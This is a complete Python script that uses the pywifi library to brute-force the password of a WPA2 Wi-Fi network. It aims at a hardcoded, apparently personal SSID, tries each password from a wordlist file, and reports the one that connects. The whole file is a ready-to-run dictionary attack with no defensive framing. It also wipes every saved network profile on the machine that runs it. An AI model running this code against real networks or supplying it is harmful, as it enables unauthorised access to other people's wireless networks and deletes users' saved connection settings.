import pywifi  # Import the pywifi module for Wi-Fi operations
from pywifi import const  # Import constants from pywifi (example, for connection status)
import time  # Import time module to manage delays

# Function to load passwords from a file
def load_passwords(file_path):
    try:
        with open(file_path, 'r') as file:
            # Read lines from the file, strip whitespace, and return as a list
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"\n:( File '{file_path}' not found. Make sure the file exists and try again.")
        exit()

# Function to connect to Wi-Fi with a given profile
def connect_to_wifi(iface, profile):
    iface.remove_all_network_profiles()  # Remove all existing profiles
    tmp_profile = iface.add_network_profile(profile)  # Add the new profile
    iface.connect(tmp_profile)  # Attempt to connect
    time.sleep(5)  # Wait for the connection to establish
    return iface.status() == const.IFACE_CONNECTED  # Check connection status

try:
    # Set up the Wi-Fi interface
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Get the primary Wi-Fi adapter

    # Specify the target SSID
    target_ssid = "Sagar_Biswas_5.4G"

    # Load the password dictionary from the file
    password_file = "passwords.txt"  # Path to your passwords file
    password_dict = load_passwords(password_file)

    # Initiate a scan to gather available networks
    iface.scan()
    time.sleep(5)  # Allow time for the scan to complete
    scan_results = iface.scan_results()

    # Find the target network by SSID
    target_network = None
    for network in scan_results:
        if network.ssid == target_ssid:
            target_network = network
            break

    # If the target network is not found, exit
    if target_network is None:
        print(f"\n:( Network with SSID '{target_ssid}' not found.")
    else:
        print(f"\n..:: ( •_•) Starting dictionary attack on SSID: {target_network.ssid}")

        # Loop through the passwords in the dictionary
        for idx, password in enumerate(password_dict, 1):
            print(f"\n==> Trying password {idx}/{len(password_dict)}: '{password}'")

            # Create a new profile for the network
            profile = pywifi.Profile()
            profile.ssid = target_ssid  # Set the SSID
            profile.auth = const.AUTH_ALG_OPEN  # Authentication algorithm (open)
            profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WPA2-PSK encryption
            profile.cipher = const.CIPHER_TYPE_CCMP  # Encryption cipher
            profile.key = password  # Current password

            # Attempt to connect using the profile
            if connect_to_wifi(iface, profile):
                print(f"\n..:: ==> :) Password found! SSID: {target_ssid}, Password: {password}")
                iface.disconnect()
                break
            else:
                print(f"\n:( Attempt with password '{password}' failed.")
        else:
            print("\n 눈_눈 Password not found in dictionary.")

except Exception as e:
    print(f"\n:`( An error occurred: {e}")

finally:
    if iface.status() == const.IFACE_CONNECTED:
        iface.disconnect()
    print("\n...::: Attack finished :::...\n")
